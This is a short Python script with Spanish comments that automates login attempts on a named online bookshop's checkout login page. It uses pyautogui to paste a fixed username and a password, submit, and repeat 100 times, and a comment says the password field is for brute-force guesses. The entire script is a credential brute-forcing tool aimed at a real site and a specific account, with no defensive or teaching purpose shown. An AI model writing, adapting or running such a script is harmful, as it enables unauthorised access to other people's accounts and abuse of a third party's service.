import pyautogui
import pyperclip
import time

#Inicio de sesion
#URL de inicio: https://www.eurobooks.co.uk/checkout/login.php

pyautogui.click() #click para poner como ventana principal a la web (estaba en terminal)


for i in range(0,100):

	pyperclip.copy("userblopez")
	pyautogui.hotkey("ctrl", "v")
	pyautogui.press('tab')

	pyperclip.copy("passincorrecta") #aqui va las pass que quieramos para la fuerza bruta
	pyautogui.hotkey("ctrl", "v")
	pyautogui.press('tab')

	pyautogui.press('enter')
	time.sleep(15)